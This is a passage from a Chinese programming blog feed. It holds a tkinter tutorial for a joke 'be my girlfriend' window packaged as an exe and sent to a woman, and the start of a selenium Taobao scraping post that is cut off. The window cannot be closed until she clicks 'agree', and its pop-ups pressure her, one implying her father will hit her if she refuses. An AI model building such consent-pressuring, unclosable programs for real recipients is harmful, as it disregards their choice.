        <content type="html"><![CDATA[<blockquote><p>自古逢秋悲寂寥，我言秋日胜春朝。<br>晴空一鹤排云上，便引诗情到碧霄。</p><p>——刘禹锡 《秋词》</p></blockquote><p>自古以来每逢秋天都会感到悲凉寂寥，可也有人反映其道而行，如刘禹锡认为秋天要胜过春天，这让我不禁想到去年朋友圈里刷屏的‘秋天的第一杯奶茶’，看到那些人秀恩爱，你是不是心里有一万只草泥马奔驰而过，今天教你一招让你的女神无法拒绝</p><span id="more"></span><p>先看一看效果图</p><p><img src="/2021/10/13/%E7%A8%8B%E5%BA%8F%E5%91%98%E7%9A%84%E6%B5%AA%E6%BC%AB%E2%80%94%E2%80%94%E6%95%99%E4%BD%A0%E8%A1%A8%E7%99%BD%EF%BC%8C%E8%AE%A9%E4%BD%A0%E7%9A%84%E5%A5%B3%E7%A5%9E%E4%B8%8D%E4%BC%9A%E6%8B%92%E7%BB%9D/1.gif"></p><p>进入正题</p><p>我的开发环境:python3.8<br>计算机系统:Windows10<br>开发工具:pycharm<br>要用的包:tkinter、random</p><p>图片放在这要用自取</p><p><img src="/2021/10/13/%E7%A8%8B%E5%BA%8F%E5%91%98%E7%9A%84%E6%B5%AA%E6%BC%AB%E2%80%94%E2%80%94%E6%95%99%E4%BD%A0%E8%A1%A8%E7%99%BD%EF%BC%8C%E8%AE%A9%E4%BD%A0%E7%9A%84%E5%A5%B3%E7%A5%9E%E4%B8%8D%E4%BC%9A%E6%8B%92%E7%BB%9D/2.png"></p><p><img src="/2021/10/13/%E7%A8%8B%E5%BA%8F%E5%91%98%E7%9A%84%E6%B5%AA%E6%BC%AB%E2%80%94%E2%80%94%E6%95%99%E4%BD%A0%E8%A1%A8%E7%99%BD%EF%BC%8C%E8%AE%A9%E4%BD%A0%E7%9A%84%E5%A5%B3%E7%A5%9E%E4%B8%8D%E4%BC%9A%E6%8B%92%E7%BB%9D/3.png"></p><p>开始写代码</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> tkinter <span class="keyword">as</span> tk</span><br><span class="line"><span class="keyword">import</span> tkinter.messagebox <span class="keyword">as</span> mb</span><br><span class="line"><span class="keyword">from</span> random <span class="keyword">import</span> randint</span><br><span class="line"></span><br><span class="line">win = tk.Tk()</span><br><span class="line">win.title(<span class="string">&#x27;表白&#x27;</span>)         <span class="comment"># 窗口名称</span></span><br><span class="line">win.geometry(<span class="string">&#x27;800x500+350+150&#x27;</span>)     <span class="comment"># 窗口大小及位置</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">win.mainloop()</span><br></pre></td></tr></table></figure><p>win.geometry(‘800x500+350+150’)里的x是字母x，前两个数据是窗口大小，后两个数据是窗口位置，运行起来就会出现一个空白的窗口</p><p><img src="/2021/10/13/%E7%A8%8B%E5%BA%8F%E5%91%98%E7%9A%84%E6%B5%AA%E6%BC%AB%E2%80%94%E2%80%94%E6%95%99%E4%BD%A0%E8%A1%A8%E7%99%BD%EF%BC%8C%E8%AE%A9%E4%BD%A0%E7%9A%84%E5%A5%B3%E7%A5%9E%E4%B8%8D%E4%BC%9A%E6%8B%92%E7%BB%9D/4.png"></p><p>将页面的内容填充一下</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">canvas = tk.Canvas(win, width=<span class="number">600</span>, height=<span class="number">300</span>)</span><br><span class="line">image_file = tk.PhotoImage(file=<span class="string">&#x27;./love.png&#x27;</span>)</span><br><span class="line">image = canvas.create_image(<span class="number">450</span>, <span class="number">0</span>, anchor=<span class="string">&#x27;n&#x27;</span>, image=image_file)</span><br><span class="line">canvas.pack(side=<span class="string">&#x27;top&#x27;</span>)</span><br><span class="line"></span><br><span class="line">tk.Label(win, text=<span class="string">&#x27;小姐姐，\n观察你很久了！\n做我女朋友好不好?&#x27;</span>, font=(<span class="string">&#x27;微软雅黑&#x27;</span>, <span class="string">&#x27;20&#x27;</span>)).place(x=<span class="number">100</span>, y=<span class="number">100</span>)</span><br><span class="line">tk.Button(win, text=<span class="string">&#x27;同意&#x27;</span>, command=agree, width=<span class="number">13</span>, height=<span class="number">2</span>).place(x=<span class="number">150</span>, y=<span class="number">350</span>)</span><br><span class="line">tk.Button(win, text=<span class="string">&#x27;考虑考虑&#x27;</span>, command=consider, width=<span class="number">13</span>, height=<span class="number">2</span>).place(x=<span class="number">350</span>, y=<span class="number">350</span>)</span><br><span class="line">bt= tk.Button(win, text=<span class="string">&#x27;拒绝&#x27;</span>, command=refuse, width=<span class="number">13</span>, height=<span class="number">2</span>)</span><br><span class="line">bt2.place(x=<span class="number">550</span>, y=<span class="number">350</span>)</span><br></pre></td></tr></table></figure><p>这里注意，第三个拒绝按钮不要再后面直接接.place()，因为我们要对拒绝按钮进行一些处理，如果加.place()的话就不是单纯的按钮了</p><p>运行会效果如下</p><p><img src="/2021/10/13/%E7%A8%8B%E5%BA%8F%E5%91%98%E7%9A%84%E6%B5%AA%E6%BC%AB%E2%80%94%E2%80%94%E6%95%99%E4%BD%A0%E8%A1%A8%E7%99%BD%EF%BC%8C%E8%AE%A9%E4%BD%A0%E7%9A%84%E5%A5%B3%E7%A5%9E%E4%B8%8D%E4%BC%9A%E6%8B%92%E7%BB%9D/5.png"></p><p>这里有一个问题，导入图片之后经常会有这样的问题：couldn’t recognize data in image file “.&#x2F;love.png”</p><p>说无法识别图像文件的数据，我看网上有很多人说只支持gif格式的，我是这样解决的，我用PS打开图片再导出就可以了，格式亲测jpg、png、gif都可以，没有PS的可以尝试一下其他的图片工具</p><p>接下给按钮添加功能</p><p>先写考虑按钮</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">consider</span>():</span><br><span class="line">    mb.showinfo(<span class="string">&#x27;别纠结了&#x27;</span>, <span class="string">&#x27;你完了，你妈让你嫁给我&#x27;</span>)</span><br><span class="line">    mb.showinfo(<span class="string">&#x27;别纠结了&#x27;</span>, <span class="string">&#x27;你爸也是这么说的&#x27;</span>)</span><br><span class="line">    mb.showinfo(<span class="string">&#x27;别纠结了&#x27;</span>, <span class="string">&#x27;你奶奶也让你嫁给我&#x27;</span>)</span><br><span class="line">    mb.showinfo(<span class="string">&#x27;别纠结了&#x27;</span>, <span class="string">&#x27;你哥哥也同意了，你全家都同意&#x27;</span>)</span><br><span class="line">    mb.showinfo(<span class="string">&#x27;别纠结了&#x27;</span>, <span class="string">&#x27;你闺蜜说嫁给我没错&#x27;</span>)</span><br><span class="line">    mb.showinfo(<span class="string">&#x27;别纠结了&#x27;</span>, <span class="string">&#x27;你爸说不同意就打你&#x27;</span>)</span><br><span class="line">    mb.showinfo(<span class="string">&#x27;别纠结了&#x27;</span>, <span class="string">&#x27;接受现实吧，我会对你好的&#x27;</span>)</span><br><span class="line">    mb.showinfo(<span class="string">&#x27;别纠结了&#x27;</span>, <span class="string">&#x27;你都是我的人了&#x27;</span>)</span><br></pre></td></tr></table></figure><p>这里用的是之前导入的包：import tkinter.messagebox as mb 是用来弹出提示框的</p><p>拒绝按钮的功能</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">refuse</span>():</span><br><span class="line">    x = randint(<span class="number">10</span>, <span class="number">600</span>)</span><br><span class="line">    y = randint(<span class="number">10</span>, <span class="number">400</span>)</span><br><span class="line">    bt2.configure(text=word[randint(<span class="number">0</span>, <span class="built_in">len</span>(word) - <span class="number">1</span>)])</span><br><span class="line">    bt2.place(x=x, y=y)</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">word = [</span><br><span class="line">    <span class="string">&#x27;我会对你好的&#x27;</span>, <span class="string">&#x27;你爸妈都同意了&#x27;</span>, <span class="string">&#x27;我有车有房&#x27;</span>, <span class="string">&#x27;家务我来做&#x27;</span>, <span class="string">&#x27;孩子我带&#x27;</span>, <span class="string">&#x27;在考虑一下吧&#x27;</span>, <span class="string">&#x27;孩子想生就生&#x27;</span>, <span class="string">&#x27;我妈会游泳&#x27;</span>, <span class="string">&#x27;你最好看&#x27;</span>, <span class="string">&#x27;给你买包&#x27;</span>, <span class="string">&#x27;钱都给你&#x27;</span>, <span class="string">&#x27;都给你买&#x27;</span>, <span class="string">&#x27;我秒回消息&#x27;</span>, <span class="string">&#x27;不存私房钱&#x27;</span></span><br><span class="line">]</span><br></pre></td></tr></table></figure><p>点击后会随机出现在界面任意位置，并且内容也会发生改变</p><p>也有进阶的，给按钮添加鼠标监听事件，只要鼠标移动到按钮上就会触发，按钮会随机出现在界面任意位置</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">a</span>(<span class="params">eve</span>):</span><br><span class="line">    <span class="keyword">if</span> a:</span><br><span class="line">        x = randint(<span class="number">10</span>, <span class="number">600</span>)</span><br><span class="line">        y = randint(<span class="number">10</span>, <span class="number">400</span>)</span><br><span class="line">        bt2.configure(text=word[randint(<span class="number">0</span>, <span class="built_in">len</span>(word) - <span class="number">1</span>)])</span><br><span class="line">        bt2.place(x=x, y=y)</span><br><span class="line">        </span><br><span class="line">        </span><br><span class="line">bt2.bind(<span class="string">&#x27;&lt;Motion&gt;&#x27;</span>,a)</span><br></pre></td></tr></table></figure><p>同意按钮功能</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">agree</span>():</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">go</span>():</span><br><span class="line">        lo.destroy()</span><br><span class="line">        win.destroy()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">clo</span>():</span><br><span class="line">        mb.showinfo(<span class="string">&#x27;卑微&#x27;</span>,<span class="string">&#x27;你都同意了，约会去嘛❤&#x27;</span>)</span><br><span class="line">    lo = tk.Toplevel(win)</span><br><span class="line">    lo.title(<span class="string">&#x27;约会&#x27;</span>)</span><br><span class="line">    lo.geometry(<span class="string">&#x27;300x300+500+300&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    img = tk.PhotoImage(file=<span class="string">&#x27;./2.png&#x27;</span>)</span><br><span class="line">    the = tk.Label(lo, image=img)</span><br><span class="line">    the.pack()</span><br><span class="line">    tk.Button(lo, text=<span class="string">&#x27;我们去约会吧&#x27;</span>, command=go).place(x=<span class="number">110</span>, y=<span class="number">220</span>)</span><br><span class="line"></span><br><span class="line">    lo.protocol(<span class="string">&#x27;WM_DELETE_WINDOW&#x27;</span>, clo)</span><br><span class="line">    lo.mainloop()</span><br></pre></td></tr></table></figure><p>点击同意后会再次出现一个界面，在这个界面里放上先要添加的东西，原理的主页面是一样的，这里图片导入的方式我用了两种，在主页面我是用的画布方式，将图片添加到画布上，在同意的子页面我是添加在了标签上，至于这两种方式有什么区别，感兴趣的同学可以去查一下相关的资料。</p><p>大致的功能写好了还有一些小功能没有实现，接下来在完善完善</p><p>点击关闭键关不掉的功能</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">close</span>():</span><br><span class="line">    mb.showinfo(<span class="string">&#x27;警告&#x27;</span>, <span class="string">&#x27;小姐姐别想逃&#x27;</span>)</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">win.protocol(<span class="string">&#x27;WM_DELETE_WINDOW&#x27;</span>, close)</span><br></pre></td></tr></table></figure><p>将界面的大小固定</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">win.resizable(<span class="literal">False</span>, <span class="literal">False</span>)</span><br></pre></td></tr></table></figure><p>菜单栏</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">do_job</span>():</span><br><span class="line">    do = tk.Toplevel(win)</span><br><span class="line">    do.geometry(<span class="string">&#x27;300x300+500+300&#x27;</span>)</span><br><span class="line">    do.title(<span class="string">&#x27;说明&#x27;</span>)</span><br><span class="line">    tk.Label(do, text=<span class="string">&#x27;不同意永远关不掉&#x27;</span>, font=(<span class="string">&#x27;微软雅黑&#x27;</span>, <span class="string">&#x27;20&#x27;</span>)).pack()</span><br><span class="line">    do.mainloop()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">menubar = tk.Menu(win)</span><br><span class="line">filemenu = tk.Menu(menubar, tearoff=<span class="number">0</span>)</span><br><span class="line">menubar.add_cascade(label=<span class="string">&#x27;帮助&#x27;</span>, menu=filemenu)</span><br><span class="line">filemenu.add_command(label=<span class="string">&#x27;说明&#x27;</span>, command=do_job)</span><br><span class="line">win.config(menu=menubar)</span><br></pre></td></tr></table></figure><p>完整代码如下</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> tkinter <span class="keyword">as</span> tk</span><br><span class="line"><span class="keyword">import</span> tkinter.messagebox <span class="keyword">as</span> mb</span><br><span class="line"><span class="keyword">from</span> random <span class="keyword">import</span> randint</span><br><span class="line"></span><br><span class="line">win = tk.Tk()</span><br><span class="line">win.title(<span class="string">&#x27;表白&#x27;</span>)         <span class="comment"># 窗口名称</span></span><br><span class="line">win.geometry(<span class="string">&#x27;800x500+350+150&#x27;</span>)     <span class="comment"># 窗口大小及位置</span></span><br><span class="line"></span><br><span class="line">canvas = tk.Canvas(win, width=<span class="number">600</span>, height=<span class="number">300</span>)</span><br><span class="line">image_file = tk.PhotoImage(file=<span class="string">&#x27;love.png&#x27;</span>)</span><br><span class="line">image = canvas.create_image(<span class="number">450</span>, <span class="number">0</span>, anchor=<span class="string">&#x27;n&#x27;</span>, image=image_file)</span><br><span class="line">canvas.pack(side=<span class="string">&#x27;top&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">agree</span>():</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">go</span>():</span><br><span class="line">        lo.destroy()</span><br><span class="line">        win.destroy()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">clo</span>():</span><br><span class="line">        mb.showinfo(<span class="string">&#x27;卑微&#x27;</span>,<span class="string">&#x27;你都同意了，约会去嘛❤&#x27;</span>)</span><br><span class="line">    lo = tk.Toplevel(win)</span><br><span class="line">    lo.title(<span class="string">&#x27;约会&#x27;</span>)</span><br><span class="line">    lo.geometry(<span class="string">&#x27;300x300+500+300&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    img = tk.PhotoImage(file=<span class="string">&#x27;./2.png&#x27;</span>)</span><br><span class="line">    the = tk.Label(lo, image=img)</span><br><span class="line">    the.pack()</span><br><span class="line">    tk.Button(lo, text=<span class="string">&#x27;我们去约会吧&#x27;</span>, command=go).place(x=<span class="number">110</span>, y=<span class="number">220</span>)</span><br><span class="line"></span><br><span class="line">    lo.protocol(<span class="string">&#x27;WM_DELETE_WINDOW&#x27;</span>, clo)</span><br><span class="line">    lo.mainloop()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">refuse</span>():</span><br><span class="line">    x = randint(<span class="number">10</span>, <span class="number">600</span>)</span><br><span class="line">    y = randint(<span class="number">10</span>, <span class="number">400</span>)</span><br><span class="line">    bt2.configure(text=word[randint(<span class="number">0</span>, <span class="built_in">len</span>(word) - <span class="number">1</span>)])</span><br><span class="line">    bt2.place(x=x, y=y)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">close</span>():</span><br><span class="line">    mb.showinfo(<span class="string">&#x27;警告&#x27;</span>, <span class="string">&#x27;小姐姐别想逃&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">do_job</span>():</span><br><span class="line">    do = tk.Toplevel(win)</span><br><span class="line">    do.geometry(<span class="string">&#x27;300x300+500+300&#x27;</span>)</span><br><span class="line">    do.title(<span class="string">&#x27;说明&#x27;</span>)</span><br><span class="line">    tk.Label(do, text=<span class="string">&#x27;不同意永远关不掉&#x27;</span>, font=(<span class="string">&#x27;微软雅黑&#x27;</span>, <span class="string">&#x27;20&#x27;</span>)).pack()</span><br><span class="line">    do.mainloop()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">consider</span>():</span><br><span class="line">    mb.showinfo(<span class="string">&#x27;别纠结了&#x27;</span>, <span class="string">&#x27;你完了，你妈让你嫁给我&#x27;</span>)</span><br><span class="line">    mb.showinfo(<span class="string">&#x27;别纠结了&#x27;</span>, <span class="string">&#x27;你爸也是这么说的&#x27;</span>)</span><br><span class="line">    mb.showinfo(<span class="string">&#x27;别纠结了&#x27;</span>, <span class="string">&#x27;你奶奶也让你嫁给我&#x27;</span>)</span><br><span class="line">    mb.showinfo(<span class="string">&#x27;别纠结了&#x27;</span>, <span class="string">&#x27;你哥哥也同意了，你全家都同意&#x27;</span>)</span><br><span class="line">    mb.showinfo(<span class="string">&#x27;别纠结了&#x27;</span>, <span class="string">&#x27;你闺蜜说嫁给我没错&#x27;</span>)</span><br><span class="line">    mb.showinfo(<span class="string">&#x27;别纠结了&#x27;</span>, <span class="string">&#x27;你爸说不同意就打你&#x27;</span>)</span><br><span class="line">    mb.showinfo(<span class="string">&#x27;别纠结了&#x27;</span>, <span class="string">&#x27;接受现实吧，我会对你好的&#x27;</span>)</span><br><span class="line">    mb.showinfo(<span class="string">&#x27;别纠结了&#x27;</span>, <span class="string">&#x27;你都是我的人了&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">a</span>(<span class="params">eve</span>):</span><br><span class="line">    <span class="keyword">if</span> a:</span><br><span class="line">        x = randint(<span class="number">10</span>, <span class="number">600</span>)</span><br><span class="line">        y = randint(<span class="number">10</span>, <span class="number">400</span>)</span><br><span class="line">        bt2.configure(text=word[randint(<span class="number">0</span>, <span class="built_in">len</span>(word) - <span class="number">1</span>)])</span><br><span class="line">        bt2.place(x=x, y=y)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">word = [</span><br><span class="line">    <span class="string">&#x27;我会对你好的&#x27;</span>, <span class="string">&#x27;你爸妈都同意了&#x27;</span>, <span class="string">&#x27;我有车有房&#x27;</span>, <span class="string">&#x27;家务我来做&#x27;</span>, <span class="string">&#x27;孩子我带&#x27;</span>, <span class="string">&#x27;在考虑一下吧&#x27;</span>, <span class="string">&#x27;孩子想生就生&#x27;</span>, <span class="string">&#x27;我妈会游泳&#x27;</span>, <span class="string">&#x27;你最好看&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;给你买包&#x27;</span>, <span class="string">&#x27;钱都给你&#x27;</span>, <span class="string">&#x27;都给你买&#x27;</span>, <span class="string">&#x27;我秒回消息&#x27;</span>, <span class="string">&#x27;不存私房钱&#x27;</span></span><br><span class="line">]</span><br><span class="line"></span><br><span class="line">tk.Label(win, text=<span class="string">&#x27;小姐姐，\n观察你很久了！\n做我女朋友好不好?&#x27;</span>, font=(<span class="string">&#x27;微软雅黑&#x27;</span>, <span class="string">&#x27;20&#x27;</span>)).place(x=<span class="number">100</span>, y=<span class="number">100</span>)</span><br><span class="line">tk.Button(win, text=<span class="string">&#x27;同意&#x27;</span>, command=agree, width=<span class="number">13</span>, height=<span class="number">2</span>).place(x=<span class="number">150</span>, y=<span class="number">350</span>)</span><br><span class="line">tk.Button(win, text=<span class="string">&#x27;考虑考虑&#x27;</span>, command=consider, width=<span class="number">13</span>, height=<span class="number">2</span>).place(x=<span class="number">350</span>, y=<span class="number">350</span>)</span><br><span class="line">bt2 = tk.Button(win, text=<span class="string">&#x27;拒绝&#x27;</span>, command=refuse, width=<span class="number">13</span>, height=<span class="number">2</span>)</span><br><span class="line">bt2.place(x=<span class="number">550</span>, y=<span class="number">350</span>)</span><br><span class="line"></span><br><span class="line">bt2.bind(<span class="string">&#x27;&lt;Motion&gt;&#x27;</span>, a)         <span class="comment"># 注释后拒绝按钮变成点击触发</span></span><br><span class="line"></span><br><span class="line">menubar = tk.Menu(win)</span><br><span class="line">filemenu = tk.Menu(menubar, tearoff=<span class="number">0</span>)</span><br><span class="line">menubar.add_cascade(label=<span class="string">&#x27;帮助&#x27;</span>, menu=filemenu)</span><br><span class="line">filemenu.add_command(label=<span class="string">&#x27;说明&#x27;</span>, command=do_job)</span><br><span class="line">win.config(menu=menubar)</span><br><span class="line"></span><br><span class="line">win.protocol(<span class="string">&#x27;WM_DELETE_WINDOW&#x27;</span>, close)</span><br><span class="line">win.resizable(<span class="literal">False</span>, <span class="literal">False</span>)</span><br><span class="line">win.mainloop()</span><br></pre></td></tr></table></figure><p>代码写好了，该怎么发给女神呢，女神电脑上又没有python环境，这里可以用pyinstaller 来将代码打包成exe文件 安装 pip install pyinstaller 安装后在你想保存的文件夹打开cmd命令板 </p><p>输入pyinstaller -F 代码路径 -w</p><p>这里的w是小写的 </p><p><strong>-F</strong> 表示生成单个可执行文件</p><p><strong>-w</strong> 表示去掉控制台窗口，这在GUI界面时非常有用。不过如果是命令行程序的话那就把这个选项删除吧！</p><p><strong>-i</strong> 表示可执行文件的图标 想要添加图标可以在后面路径，后缀名为.ico</p><p>打包成功是这样的</p><p><img src="/2021/10/13/%E7%A8%8B%E5%BA%8F%E5%91%98%E7%9A%84%E6%B5%AA%E6%BC%AB%E2%80%94%E2%80%94%E6%95%99%E4%BD%A0%E8%A1%A8%E7%99%BD%EF%BC%8C%E8%AE%A9%E4%BD%A0%E7%9A%84%E5%A5%B3%E7%A5%9E%E4%B8%8D%E4%BC%9A%E6%8B%92%E7%BB%9D/6.png"></p><p>我们的可执行文件解放在dist文件夹下，现在你直接运行是会报错的，我们要图片放到exe文件的同级文件夹下就行了，注意图片名一定要和你写代码时的图片名相同，弄好之后就可以打包发给你女神了</p><p><img src="/2021/10/13/%E7%A8%8B%E5%BA%8F%E5%91%98%E7%9A%84%E6%B5%AA%E6%BC%AB%E2%80%94%E2%80%94%E6%95%99%E4%BD%A0%E8%A1%A8%E7%99%BD%EF%BC%8C%E8%AE%A9%E4%BD%A0%E7%9A%84%E5%A5%B3%E7%A5%9E%E4%B8%8D%E4%BC%9A%E6%8B%92%E7%BB%9D/7.png"></p><p>不说了，天台挺凉快的</p>]]></content>
      
      
      
        <tags>
            
            <tag> tkinter </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>程序员怎样买东西呢---selenium爬取淘宝数据</title>
      <link href="/2021/10/12/%E7%A8%8B%E5%BA%8F%E5%91%98%E6%80%8E%E6%A0%B7%E4%B9%B0%E4%B8%9C%E8%A5%BF%E5%91%A2-selenium%E7%88%AC%E5%8F%96%E6%B7%98%E5%AE%9D%E6%95%B0%E6%8D%AE/"/>
      <url>/2021/10/12/%E7%A8%8B%E5%BA%8F%E5%91%98%E6%80%8E%E6%A0%B7%E4%B9%B0%E4%B8%9C%E8%A5%BF%E5%91%A2-selenium%E7%88%AC%E5%8F%96%E6%B7%98%E5%AE%9D%E6%95%B0%E6%8D%AE/</url>
      
        <content type="html"><![CDATA[<blockquote><p>江山代有才人出,各领风骚数百年</p><p>​——清·赵翼 《论诗五首·其二》</p><p>长江后浪推前浪，浮事新人换旧人</p><p>​ ——宋·刘斧《青琐高议》</p></blockquote><p>东西用时间长了就该换新的了，特别是手机，这几年发展太快，APP是越来越大，内存是越来越不够用了，想要换新的手机，但不知道换什么，那今天就爬一下淘宝，看一下淘宝手机的数据，参考一下</p><span id="more"></span><p>我的开发环境:python3.8<br>计算机系统:Windows10<br>开发工具:pycharm<br>要用的包:selenium、csv、time<br>网址:<a href="https://www.taobao.com/">https://www.taobao.com/</a><br>今天用的是自动化测试工具selenium，没有这个包的同学可以用pip install selenium 来安装<br>安装完之后还需要安装个浏览器驱动，我用的是谷歌浏览器</p><p><a href="http://chromedriver.storage.googleapis.com/index.html">http://chromedriver.storage.googleapis.com/index.html</a><br>打开这个链接，找到你浏览器版本所对应的驱动，这是我的浏览器版本</p><p><img src="/2021/10/12/%E7%A8%8B%E5%BA%8F%E5%91%98%E6%80%8E%E6%A0%B7%E4%B9%B0%E4%B8%9C%E8%A5%BF%E5%91%A2-selenium%E7%88%AC%E5%8F%96%E6%B7%98%E5%AE%9D%E6%95%B0%E6%8D%AE/1.png"></p><p>可以看到我的版本是94.0.4606.81 没有找到一样的就找低一个版本的</p><p><img src="/2021/10/12/%E7%A8%8B%E5%BA%8F%E5%91%98%E6%80%8E%E6%A0%B7%E4%B9%B0%E4%B8%9C%E8%A5%BF%E5%91%A2-selenium%E7%88%AC%E5%8F%96%E6%B7%98%E5%AE%9D%E6%95%B0%E6%8D%AE/2.png"></p><p>选择对应的系统，我的是win系统</p><p><img src="/2021/10/12/%E7%A8%8B%E5%BA%8F%E5%91%98%E6%80%8E%E6%A0%B7%E4%B9%B0%E4%B8%9C%E8%A5%BF%E5%91%A2-selenium%E7%88%AC%E5%8F%96%E6%B7%98%E5%AE%9D%E6%95%B0%E6%8D%AE/3.png"></p><p>把下载的压缩文件解压后，放到python解释器的当前文件夹下</p><p><img src="/2021/10/12/%E7%A8%8B%E5%BA%8F%E5%91%98%E6%80%8E%E6%A0%B7%E4%B9%B0%E4%B8%9C%E8%A5%BF%E5%91%A2-selenium%E7%88%AC%E5%8F%96%E6%B7%98%E5%AE%9D%E6%95%B0%E6%8D%AE/4.png"></p><p>验证一下</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> selenium.webdriver <span class="keyword">import</span> Chrome</span><br><span class="line"></span><br><span class="line">web = Chrome()</span><br><span 